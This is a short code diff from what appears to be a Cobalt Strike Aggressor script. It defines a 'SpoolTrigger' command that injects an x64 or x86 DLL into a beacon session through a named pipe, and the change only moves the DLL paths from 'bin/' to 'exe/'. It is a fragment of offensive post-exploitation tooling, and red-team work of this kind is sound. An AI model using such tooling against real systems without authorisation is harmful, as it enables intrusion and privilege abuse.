@@ -11,10 +11,10 @@ sub SpoolTrigger {
     if ($method eq "spawn") {
         # this is to avoid cross-arch injection where possible
         if(binfo($bid, 'barch') eq 'x64') {
-            bdllspawn($1, script_resource("bin/SpoolTrigger.x64.dll"), $pipename, "spooltrigger", 5000, true);
+            bdllspawn($1, script_resource("exe/SpoolTrigger.x64.dll"), $pipename, "spooltrigger", 5000, true);
         }
         else {
-            bdllspawn($1, script_resource("bin/SpoolTrigger.x86.dll"), $pipename, "spooltrigger", 5000, true);
+            bdllspawn($1, script_resource("exe/SpoolTrigger.x86.dll"), $pipename, "spooltrigger", 5000, true);
         }
     }
     else {
